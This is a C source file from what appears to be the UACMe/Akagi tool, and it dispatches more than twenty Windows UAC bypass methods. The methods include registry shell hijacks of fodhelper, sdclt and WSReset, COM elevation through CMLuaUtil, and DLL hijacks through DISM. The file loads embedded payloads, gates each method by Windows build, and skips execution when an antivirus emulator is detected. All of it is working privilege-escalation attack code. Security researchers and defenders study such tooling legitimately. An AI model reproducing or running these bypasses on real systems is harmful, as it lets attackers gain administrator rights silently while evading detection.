/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2020
*
*  TITLE:       METHODS.C
*
*  VERSION:     3.52
*
*  DATE:        28 Oct 2020
*
*  UAC bypass dispatch.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

UCM_API(MethodTest);
UCM_API(MethodSXS);
UCM_API(MethodDism);
UCM_API(MethodWow64Logger);
UCM_API(MethodUiAccess);
UCM_API(MethodMsSettings);
UCM_API(MethodTyranid);
UCM_API(MethodJunction);
UCM_API(MethodSXSDccw);
UCM_API(MethodHakril);
UCM_API(MethodCorProfiler);
UCM_API(MethodCMLuaUtil);
UCM_API(MethodDccwCOM);
UCM_API(MethodDirectoryMock);
UCM_API(MethodShellSdctl);
UCM_API(MethodTokenModUIAccess);
UCM_API(MethodShellWSReset);
UCM_API(MethodEditionUpgradeManager);
UCM_API(MethodDebugObject);
UCM_API(MethodShellChangePk);
UCM_API(MethodNICPoison);
UCM_API(MethodDeprecated);
UCM_API(MethodIeAddOnInstall);
UCM_API(MethodWscActionProtocol);

#define UCM_WIN32_NOT_IMPLEMENTED_COUNT 5
ULONG UCM_WIN32_NOT_IMPLEMENTED[UCM_WIN32_NOT_IMPLEMENTED_COUNT] = {
    UacMethodWow64Logger,
    UacMethodEditionUpgradeMgr,
    UacMethodNICPoison,
    UacMethodIeAddOnInstall,
    UacMethodWscActionProtocol
};

UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
    { MethodTest, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodSXS, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodDism, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodWow64Logger, { 7600, MAXDWORD }, AKATSUKI_ID, FALSE, TRUE, TRUE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodUiAccess, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodMsSettings, { 10240, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodTyranid, { 9600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodJunction, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodSXSDccw, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodHakril, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, FALSE, TRUE },
    { MethodCorProfiler, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodCMLuaUtil, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDccwCOM, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, TRUE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDirectoryMock, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodShellSdctl, { 14393, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodTokenModUIAccess, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, FALSE },
    { MethodShellWSReset, { 17134, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodEditionUpgradeManager, { 14393, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodDebugObject, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodDeprecated, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodShellChangePk, { 14393, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodMsSettings, { 17134, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodNICPoison, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodIeAddOnInstall, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodWscActionProtocol, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE }
};

/*
* IsMethodImplementedForWin32
*
* Purpose:
*
* Check if method implemented in win32 version.
*
*/
__forceinline BOOL IsMethodImplementedForWin32(
    _In_ UCM_METHOD Method)
{
    UINT i;
    for (i = 0; i < UCM_WIN32_NOT_IMPLEMENTED_COUNT; i++)
        if (UCM_WIN32_NOT_IMPLEMENTED[i] == (ULONG)Method)
            return FALSE;
    return TRUE;
}

/*
* IsMethodMatchRequirements
*
* Purpose:
*
* Check system requirements of the given method.
*
*/
NTSTATUS IsMethodMatchRequirements(
    _In_ PUCM_API_DISPATCH_ENTRY Entry
)
{
#ifdef _DEBUG
    UNREFERENCED_PARAMETER(Entry);
#else
    WCHAR szMessage[MAX_PATH];
    //
    //  Check Wow64 flags first. Disable this check for debugging build.
    //
    if (g_ctx->IsWow64) {
        if (Entry->DisallowWow64) {
            ucmShowMessageById(g_ctx->OutputToDebugger, ISDB_USAGE_WOW_DETECTED);
            return STATUS_NOT_SUPPORTED;
        }
    }
#ifdef _WIN64
    else {
        //
        // Not required if Win32.
        //
        if (Entry->Win32OrWow64Required != FALSE) {
            ucmShowMessageById(g_ctx->OutputToDebugger, ISDB_USAGE_WOW64WIN32ONLY);
            return STATUS_NOT_SUPPORTED;
        }
    }
#endif //_WIN64

    //
    //  Check availability. Disable this check for debugging build.
    //
    if (g_ctx->dwBuildNumber < Entry->Availability.MinumumWindowsBuildRequired) {
        RtlSecureZeroMemory(&szMessage, sizeof(szMessage));
        _strcpy(szMessage, L"Current Windows Build: ");
        ultostr(g_ctx->dwBuildNumber, _strend(szMessage));
        _strcat(szMessage, L"\nMinimum Windows Build Required: ");
        ultostr(Entry->Availability.MinumumWindowsBuildRequired, _strend(szMessage));
        _strcat(szMessage, L"\nAborting execution.");
        ucmShowMessage(g_ctx->OutputToDebugger, szMessage);
        return STATUS_NOT_SUPPORTED;
    }
    if (g_ctx->dwBuildNumber >= Entry->Availability.MinimumExpectedFixedWindowsBuild) {
        if (ucmShowQuestionById(ISDB_USAGE_UACFIX) == IDNO) {
            return STATUS_NOT_SUPPORTED;
        }
    }
#endif
    return STATUS_SUCCESS;
}

/*
* PostCleanupAttempt
*
* Purpose:
*
* Attempt to cleanup left overs.
*
*/
VOID PostCleanupAttempt(
    _In_ UCM_METHOD Method
)
{
    switch (Method) {

    case UacMethodDISM:
        ucmMethodCleanupSingleItemSystem32(DISMCORE_DLL);
        break;

    case UacMethodWow64Logger:
        ucmMethodCleanupSingleItemSystem32(WOW64LOG_DLL);
        break;

    case UacMethodJunction:
        ucmJunctionMethodCleanup();
        break;

    case UacMethodSXSConsent:
        ucmSXSMethodCleanup();
        break;

    case UacMethodSXSDccw:
        ucmSXSDccwMethodCleanup();
        break;

    case UacMethodHakril:
        ucmHakrilMethodCleanup();
        break;

    default:
        break;
    }
}

/*
* MethodsManagerCall
*
* Purpose:
*
* Run method by method id.
*
*/
NTSTATUS MethodsManagerCall(
    _In_ UCM_METHOD Method
)
{
    BOOL        bParametersBlockSet = FALSE;
    NTSTATUS    MethodResult, Status;
    ULONG       PayloadSize = 0, DataSize = 0;
    PVOID       PayloadCode = NULL, Resource = NULL;
    PVOID       ImageBaseAddress = g_hInstance;

    PUCM_API_DISPATCH_ENTRY Entry;

    UCM_PARAMS_BLOCK ParamsBlock;

    if (wdIsEmulatorPresent3()) {
        return STATUS_NOT_SUPPORTED;
    }

    if (Method >= UacMethodMax)
        return STATUS_INVALID_PARAMETER;

    //
    // Is method implemented for Win32?
    //
#ifndef _WIN64
    if (!IsMethodImplementedForWin32(Method)) {
        return STATUS_NOT_SUPPORTED;
    }
#endif //_WIN64

    Entry = &ucmMethodsDispatchTable[Method];

    Status = IsMethodMatchRequirements(Entry);
    if (!NT_SUCCESS(Status))
        return Status;

    if (Entry->PayloadResourceId != PAYLOAD_ID_NONE) {

        Resource = supLdrQueryResourceData(
            Entry->PayloadResourceId,
            ImageBaseAddress,
            &DataSize);

        if (Resource) {
            PayloadCode = g_ctx->DecompressRoutine(Entry->PayloadResourceId, Resource, DataSize, &PayloadSize);
        }

        if ((PayloadCode == NULL) || (PayloadSize == 0)) {
            return STATUS_DATA_ERROR;
        }
    }

    ParamsBlock.Method = Method;
    ParamsBlock.PayloadCode = PayloadCode;
    ParamsBlock.PayloadSize = PayloadSize;

    //
    // Set shared parameters.
    //
    //   1. Execution parameters (flag, session id, winstation\desktop)
    //   2. Optional parameter from Akagi command line.
    //
    if (Entry->SetParameters) {
        bParametersBlockSet = supCreateSharedParametersBlock(g_ctx);
    }

    MethodResult = Entry->Routine(&ParamsBlock);

    if (PayloadCode) {
        RtlSecureZeroMemory(PayloadCode, PayloadSize);
        supVirtualFree(PayloadCode, NULL);
    }

    //
    // Wait a little bit for completion.
    //
    if (Entry->SetParameters) {
        if (bParametersBlockSet) {
            supWaitForGlobalCompletionEvent();
            supDestroySharedParametersBlock(g_ctx);
        }
    }

    PostCleanupAttempt(Method);

    return MethodResult;
}

/************************************************************
**
**
**
** Method table wrappers
**
**
**
************************************************************/

UCM_API(MethodDeprecated)
{
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
}

UCM_API(MethodTest)
{
#ifdef _DEBUG
    return ucmTestRoutine(Parameter->PayloadCode, Parameter->PayloadSize);
#else
    UNREFERENCED_PARAMETER(Parameter);
    return TRUE;
#endif
}

UCM_API(MethodSXS)
{
    return ucmSXSMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize,
        NULL,
        CONSENT_EXE,
        MSCONFIG_EXE,
        TRUE);
}

UCM_API(MethodDism)
{
    return ucmDismMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodWow64Logger)
{
    //
    //  Required x64 as this method abuse wow64 logger mechanism
    //
#ifdef _WIN64
    return ucmWow64LoggerMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#else
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#endif
}

UCM_API(MethodUiAccess)
{
    return ucmUiAccessMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodMsSettings)
{
    LPWSTR lpszPayload = NULL;
    LPWSTR lpszTargetApp = NULL;

    WCHAR szTargetApp[MAX_PATH * 2];

    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    if (Parameter->Method == UacMethodMsSettings2)
        lpszTargetApp = COMPUTERDEFAULTS_EXE;
    else
        lpszTargetApp = FODHELPER_EXE;

    _strcpy(szTargetApp, g_ctx->szSystemDirectory);
    _strcat(szTargetApp, lpszTargetApp);

    return ucmShellRegModMethod(Parameter->Method,
        T_MSSETTINGS,
        szTargetApp,
        lpszPayload);
}

UCM_API(MethodTyranid)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmDiskCleanupEnvironmentVariable(lpszPayload);
}

UCM_API(MethodJunction)
{
    return ucmJunctionMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodSXSDccw)
{
    return ucmSXSDccwMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodHakril)
{
    return ucmHakrilMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodCorProfiler)
{
    return ucmCorProfilerMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodCMLuaUtil)
{
    LPWSTR lpszParameter;

    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszParameter = g_ctx->szDefaultPayload;
    else
        lpszParameter = g_ctx->szOptionalParameter;

    return ucmCMLuaUtilShellExecMethod(lpszParameter);
}

UCM_API(MethodDccwCOM)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmDccwCOMMethod(lpszPayload);
}

UCM_API(MethodDirectoryMock)
{
    return ucmDirectoryMockMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodShellSdctl)
{
    LPWSTR Payload = NULL;

    if (g_ctx->OptionalParameterLength == 0)
        Payload = g_ctx->szDefaultPayload;
    else
        Payload = g_ctx->szOptionalParameter;

    return ucmShellRegModMethod(Parameter->Method,
        T_CLASSESFOLDER,
        SDCLT_EXE,
        Payload);
}

UCM_API(MethodTokenModUIAccess)
{
    return ucmTokenModUIAccessMethod(Parameter->PayloadCode,
        Parameter->PayloadSize);
}

UCM_API(MethodShellWSReset)
{
    ULONG Result = 0;
    LPWSTR PayloadParameter = NULL, PayloadFinal = NULL;
    SIZE_T Size;

    if (g_ctx->OptionalParameterLength == 0)
        PayloadParameter = g_ctx->szDefaultPayload;
    else
        PayloadParameter = g_ctx->szOptionalParameter;

    Size = ((MAX_PATH * 2) + _strlen(PayloadParameter)) * sizeof(WCHAR);
    PayloadFinal = supHeapAlloc(Size);
    if (PayloadFinal) {

        _strcpy(PayloadFinal, g_ctx->szSystemDirectory);
        _strcat(PayloadFinal, CMD_EXE);
        _strcat(PayloadFinal, RUN_CMD_COMMAND);
        _strcat(PayloadFinal, PayloadParameter);

        Result = ucmShellRegModMethod2(Parameter->Method,
            T_APPXPACKAGE,
            WSRESET_EXE,
            PayloadFinal);

        supHeapFree(PayloadFinal);
    }

    return Result;
}

UCM_API(MethodEditionUpgradeManager)
{
#ifndef _WIN64
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#else
    return ucmEditionUpgradeManagerMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#endif
}

UCM_API(MethodDebugObject)
{
    LPWSTR lpszPayload = NULL;
    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmDebugObjectMethod(lpszPayload);
}

UCM_API(MethodShellChangePk)
{
    LPWSTR lpszPayload = NULL;

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmShellRegModMethod(Parameter->Method,
        T_LAUNCHERSYSTEMSETTINGS,
        SLUI_EXE,
        lpszPayload);
}

UCM_API(MethodNICPoison)
{
#ifndef _WIN64
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#else
    return ucmNICPoisonMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#endif
}

UCM_API(MethodIeAddOnInstall)
{
#ifdef _WIN64
    return ucmIeAddOnInstallMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#else
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#endif
}

UCM_API(MethodWscActionProtocol)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Parameter);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx->OptionalParameterLength == 0)
        lpszPayload = g_ctx->szDefaultPayload;
    else
        lpszPayload = g_ctx->szOptionalParameter;

    return ucmWscActionProtocolMethod(lpszPayload);
}
